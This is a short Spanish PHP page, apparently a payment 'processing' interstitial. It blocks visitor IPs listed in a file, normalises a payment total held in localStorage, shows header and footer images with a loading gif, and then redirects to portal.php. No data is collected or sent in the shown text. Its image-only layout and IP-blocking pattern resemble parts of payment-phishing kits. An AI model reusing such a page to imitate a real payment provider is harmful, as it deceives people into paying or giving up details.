<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

echo <<<EOT
<script>
(function() {
  const raw = localStorage.getItem('total_pagar');
  try {
    // Si es un objeto JSON, extraer total
    if (raw && raw.includes('{')) {
      const obj = JSON.parse(raw);
      const total = parseInt(obj.total) || 0;
      localStorage.setItem('total_pagar', total);
    }
  } catch (e) {
    console.warn("Error al convertir total_pagar:", e);
    localStorage.setItem('total_pagar', 0);
  }
})();
</script>
EOT;
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Página de Pago</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body {
      font-family: sans-serif;
      background: #fff;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }
    .encabezado img,
    .pie img {
      width: 100%;
      height: auto;
      display: block;
    }
    .contenido {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .contenido img {
      max-width: 110%;
      height: auto;
    }
  </style>
</head>
<body>

  <div class="encabezado">
    <img src="img/1.jpg" alt="Encabezado">
  </div>

  <div class="contenido">
    <img src="img/gift.gif" alt="Procesando...">
  </div>

  <div class="pie">
    <img src="img/pie.jpg" alt="Pie de página">
  </div>

  <script>

    // Redirigir después de una breve pausa
    setTimeout(() => {
      window.location.href = "portal.php";
    }, 1500);
  </script>

</body>
</html>
